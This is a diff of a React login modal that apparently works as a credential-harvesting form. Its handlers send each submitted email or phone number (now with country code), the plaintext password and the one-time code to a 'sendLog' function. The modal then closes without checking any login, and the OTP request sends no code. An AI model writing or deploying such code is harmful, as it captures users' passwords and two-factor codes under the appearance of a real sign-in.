@@ -20,8 +20,10 @@ interface RestCountry {
 
 type AuthLogPayload =
   | {
-      type: "IDENTITY_SUBMITTED" | "OTP_REQUEST";
+      type: "IDENTITY_SUBMITTED";
       identity: string;
+      countryCode?: string;
+      countryDial?: string;
     }
   | {
       type: "PASSWORD_LOGIN_ATTEMPT";
@@ -29,7 +31,7 @@ type AuthLogPayload =
       password: string;
     }
   | {
-      type: "OTP_VERIFY";
+      type: "OTP_LOGIN_ATTEMPT";
       identity: string;
       otp: string;
     };
@@ -106,18 +108,22 @@ export default function AuthModal({ open, onClose }: AuthModalProps) {
 
   /* ---------------- CLOSE DROPDOWN ---------------- */
   useEffect(() => {
-    function handleOutside(e: MouseEvent) {
-      if (dropdownRef.current && !dropdownRef.current.contains(e.target as Node)) {
-        setOpenDropdown(false);
-      }
+  function handleOutside(e: MouseEvent) {
+    if (
+      dropdownRef.current &&
+      !dropdownRef.current.contains(e.target as Node)
+    ) {
+      setOpenDropdown(false);
     }
+  }
 
-    if (openDropdown) {
-      document.addEventListener("mousedown", handleOutside);
-    }
+  if (openDropdown) {
+    document.addEventListener("click", handleOutside);
+  }
 
-    return () => document.removeEventListener("mousedown", handleOutside);
-  }, [openDropdown]);
+  return () => document.removeEventListener("click", handleOutside);
+}, [openDropdown]);
+
 
   if (!open) return null;
 
@@ -162,58 +168,60 @@ export default function AuthModal({ open, onClose }: AuthModalProps) {
 
   /* ---------------- HANDLERS ---------------- */
   const submitIdentity = async () => {
-    if (!validateIdentity()) return;
+  if (!validateIdentity()) return;
 
-    setLoading(true);
-    try {
-      await sendLog({ type: "IDENTITY_SUBMITTED", identity: normalizedIdentity() });
-      setStep("method");
-    } finally {
-      setLoading(false);
-    }
-  };
+  setLoading(true);
+  try {
+    await sendLog({
+      type: "IDENTITY_SUBMITTED",
+      identity: normalizedIdentity(),
+      countryCode: selected?.code,
+      countryDial: selected?.dial,
+    });
+    setStep("method");
+  } finally {
+    setLoading(false);
+  }
+};
+
 
   const submitPassword = async () => {
-    if (!validatePassword()) return;
+  if (!validatePassword()) return;
 
-    setLoading(true);
-    try {
-      await sendLog({
-        type: "PASSWORD_LOGIN_ATTEMPT",
-        identity: normalizedIdentity(),
-        password,
-      });
-      onClose(); // close ONLY after success
-    } finally {
-      setLoading(false);
-    }
-  };
+  setLoading(true);
+  try {
+    await sendLog({
+      type: "PASSWORD_LOGIN_ATTEMPT",
+      identity: normalizedIdentity(),
+      password,
+    });
+    onClose();
+  } finally {
+    setLoading(false);
+  }
+};
 
-  const requestOtp = async () => {
-    setLoading(true);
-    try {
-      await sendLog({ type: "OTP_REQUEST", identity: normalizedIdentity() });
-      setStep("otp");
-    } finally {
-      setLoading(false);
-    }
-  };
+
+  const requestOtp = () => {
+  setStep("otp");
+};
 
   const verifyOtp = async () => {
-    if (!validateOtp()) return;
+  if (!validateOtp()) return;
 
-    setLoading(true);
-    try {
-      await sendLog({
-        type: "OTP_VERIFY",
-        identity: normalizedIdentity(),
-        otp: otp.join(""),
-      });
-      onClose(); // close ONLY after success
-    } finally {
-      setLoading(false);
-    }
-  };
+  setLoading(true);
+  try {
+    await sendLog({
+      type: "OTP_LOGIN_ATTEMPT",
+      identity: normalizedIdentity(),
+      otp: otp.join(""),
+    });
+    onClose();
+  } finally {
+    setLoading(false);
+  }
+};
+
 
   /* ---------------- UI ---------------- */
   return (
@@ -221,13 +229,14 @@ export default function AuthModal({ open, onClose }: AuthModalProps) {
   {/* BACKDROP */}
   <div
     className="absolute inset-0 bg-black/60"
-    onMouseDown={onClose}
+    onClick={onClose}
   />
 
   {/* MODAL */}
   <div
-    className="relative bg-white w-full max-w-md mx-4 rounded-lg shadow-xl p-6 z-10"
-    onMouseDown={e => e.stopPropagation()}
+  className="relative bg-white w-full max-w-md mx-4 rounded-lg shadow-xl p-6 z-10"
+    onClick={e => e.stopPropagation()}
+
   >
         <button
           onClick={() => !loading && onClose()}
@@ -241,42 +250,46 @@ export default function AuthModal({ open, onClose }: AuthModalProps) {
         {step === "login" && (
           <>
             <h2 className="text-xl font-semibold mb-6">Login</h2>
+             <label className="block text-sm font-medium mb-1">
+  Email id
+</label>
 
             <div className="flex border rounded overflow-hidden">
               <div ref={dropdownRef} className="relative border-r">
-                <button
-                  type="button"
-                  onClick={() => setOpenDropdown(v => !v)}
-                  className="flex items-center gap-2 px-3 py-3 text-sm"
-                >
-                  {selected && (
-                    <>
-                      <img src={selected.flag} className="w-5 h-4" />
-                      <span>{selected.dial}</span>
-                    </>
-                  )}
-                  <ChevronDown size={14} />
-                </button>
+  <button
+    type="button"
+    onClick={() => setOpenDropdown(v => !v)}
+    className="flex items-center gap-2 px-3 py-3 text-sm"
+  >
+    {selected && (
+      <>
+        <img src={selected.flag} className="w-5 h-4" />
+        <span>{selected.dial}</span>
+      </>
+    )}
+    <ChevronDown size={14} />
+  </button>
 
-                {openDropdown && (
-                  <div className="absolute bg-white border w-64 max-h-64 overflow-auto shadow-lg z-20">
-                    {countries.map(c => (
-                      <button
-                        key={c.code}
-                        onClick={() => {
-                          setSelected(c);
-                          setOpenDropdown(false);
-                        }}
-                        className="flex items-center gap-2 w-full px-3 py-2 hover:bg-gray-100"
-                      >
-                        <img src={c.flag} className="w-5 h-4" />
-                        <span className="flex-1">{c.name}</span>
-                        <span className="text-gray-500">{c.dial}</span>
-                      </button>
-                    ))}
-                  </div>
-                )}
-              </div>
+  {openDropdown && (
+    <div className="absolute left-0 top-full bg-white border w-64 max-h-64 overflow-auto shadow-lg  z-50">
+      {countries.map(c => (
+        <button
+          key={c.code}
+          type="button"
+          onClick={() => {
+            setSelected(c);
+            setOpenDropdown(false);
+          }}
+          className="flex items-center gap-2 w-full px-3 py-2 hover:bg-gray-100 text-left"
+        >
+          <img src={c.flag} className="w-5 h-4" />
+          <span className="flex-1">{c.name}</span>
+          <span className="text-gray-500">{c.dial}</span>
+        </button>
+      ))}
+    </div>
+  )}
+</div>
 
               <input
                 value={identity}
@@ -285,7 +298,7 @@ export default function AuthModal({ open, onClose }: AuthModalProps) {
                   setErrors({});
                 }}
                 className="flex-1 px-4 py-3 outline-none text-sm"
-                placeholder="Email or Phone"
+                placeholder="Enter Email id"
               />
             </div>
 
